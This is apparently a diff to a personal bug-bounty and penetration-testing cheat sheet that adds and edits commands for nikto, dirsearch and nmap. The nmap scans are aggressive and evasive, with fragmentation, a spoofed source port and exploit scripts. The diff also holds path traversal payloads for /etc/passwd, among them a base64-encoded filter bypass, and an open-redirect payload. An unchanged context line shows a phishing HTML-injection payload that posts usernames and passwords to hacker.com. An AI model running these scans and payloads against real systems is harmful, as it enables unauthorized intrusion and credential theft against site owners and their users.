@@ -87,6 +87,10 @@ Automatic scanners
 templates/exposures -t /root/nuclei-templates/sqli.yaml
 	- nuclei -u https://example.com -w workflows/
 2- whatweb --no-errors 10.10.10.0/24
+2- nikto -h domains.txt
+	-nikto -h example.com -IgnoreCode 301
+	-nikto -h example.com -id username:password => to put auth
+	-nikto -h example.com -useproxy proxy.ip.address.here
 3-wpscan =>  Wpscan --url https://site.com/wordpress -e at -e ap -e u	--api-token ----------------
 4- echo subdomains.txt | httpx --silent | nuclei -t php8-dev-rce.yaml
 5- cat hosts.txt | while read host do; do curl -s -k --insecure "$host/secure/ViewUserHover.jspa"|grep -qsi "User does not exist"&&
@@ -132,7 +136,10 @@ Pass:anonymous
 ## Collect all interisting ips from Shodan and save them in ips.txt
 - cat ips.txt | httpx > live-ips.txt
 - cat live_ips.txt | dirsearch --stdin
-
+python3 dirsearch.py -e php -u https://geeksforgeeks.org –prefixes .,admin,_,~
+python3 dirsearch.py -e php -u https://geeksforgeeks.org –suffixes ~,/
+scan subdirectories => python3 dirsearch.py -e php,html,js -u https://geeksforgeeks.org –subdirs admin/,folder/,/
+python3 dirsearch.py -e php,html,js -u https://geeksforgeeks.org –proxy 127.0.0.1:8080
 
 2- github dorks
 	- git-Grabber :-
@@ -184,7 +191,6 @@ link:www.hackerone.com | link:www.slack.com | link:www.github.com
 
 -----------------------------------------------------------------------------------------------------
 Nmap 
-Nmap
 nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt 
 nmap 192.168.1.1 -Pn -sS -A -sV -sC -p ......  --script=vuln
 nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting)
@@ -203,6 +209,7 @@ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv
 nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
 nmap -sV --script=vuln target
 nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
+sudo nmap -g 53 -f -sV -p0- -O --script vuln,auth,exploit 10.0.2.5 -T5
 
 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5		==> to get live ip 
 nmap google.com	-oA target 
@@ -1124,7 +1131,9 @@ Blind Sqli
 -------------------------------------------------------------------------------------------------------------------------------------------------
 path traversal 
 httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
-
+file=../../../../../../etc/passwd => 403
+file=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==	=> base64 encoding => 200
+../../../../../../../../etc/passwd{{	=>200
 
 
 
@@ -1416,6 +1425,8 @@ HTML INJECTION
 http://vulnuerable.com/phishing/index.php?url=document.write('<h3>Please login to continue</h3><form action=http://hacker.com/file.php><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 
 2- http://example.com/dir/<h1>hossam</h1>?debug=layout
+3- 	Tried everything 403 forbidden  
+	Tried this Payload : "><a href="//bing.com">Redirect</a>  Worked fine 	=> open redirect
 
 
 
